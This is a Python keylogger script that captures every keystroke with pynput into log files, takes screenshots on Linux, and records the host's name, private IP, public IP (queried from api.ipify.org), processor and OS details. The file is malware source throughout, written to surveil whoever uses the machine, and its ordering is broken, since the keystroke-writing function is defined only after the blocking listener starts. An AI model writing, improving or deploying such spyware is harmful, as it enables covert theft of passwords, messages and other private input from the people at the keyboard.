from pynput.keyboard import Key, Listener
from requests import get
import logging
import socket
import platform
import os
import pyscreenshot

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

log_dir = r"/home/sirius/Documents/Logs/"
logging.basicConfig(filename = (log_dir + "keylog.txt"), level = logging.DEBUG, format = '%(asctime)s: %(message)s')
count = 0
unsorted_data = []
working_os = platform.system()

# files
sys_info = 'systeminfo.txt'
screenshots_logged = 'screenshot.png'

# Record Keystrokes
def on_press(key):
  global count, unsorted_data
  logging.info(str(key))
  unsorted_data.append(str(key))
  count += 1
  if count >= 20:
    count = 0
    write_file(unsorted_data)
    unsorted_data = []

# Exit Function
def on_release(key):
  if key == Key.esc:
    return False


with Listener(on_press = on_press, on_release = on_release) as listener:
  listener.join()

# Clean Data function
def write_file(unsorted_data):
  with open("sorted-data.txt", "a") as clean_file:
    for key in unsorted_data:
      clean_key = str(key).replace("'", "")
      if clean_key.find("space") > 0:
        clean_file.write('\n')
      elif clean_key.find("Key") == -1:
        clean_file.write(clean_key)

# Record Screenshot
def screenshotWinMacLin():
  if working_os == "Linux":
    try:    
      captureScreen = pyscreenshot.grab()
      captureScreen.save('updates/screenshot.jpg', 'JPEG')
    except Exception:
      image = ImageGrab.grab(all_screens = True)
      image.save(screenshots_logged)
  else:
    pass
screenshotWinMacLin()

# Extracting Computer Information
def log_computerInfo():
  with open(sys_info, "w") as sysfile:
    hostname = socket.gethostname()
    IPAddress = socket.gethostbyname(hostname)
    try:
      public_IPAddr = get("https://api.ipify.org").text
      sysfile.write("Public IP Address: " + public_IPAddr)
    except Exception:
      sysfile.write("Not able to find Public IP Address.")
    try:
      sysfile.write("Processor: " + (platform.processor()) + '\n')
      platform_OS = platform.system()
      sysfile.write("System: " + platform_OS + ' ' + platform.version() + '\n')
      sysfile.write("Machine: " + platform.machine() + '\n')
      sysfile.write("Hostname: " + hostname + '\n')
      sysfile.write("Private IP Address: " + IPAddress + '\n')
    except Exception:
      pass
    sysfile.close()
log_computerInfo()
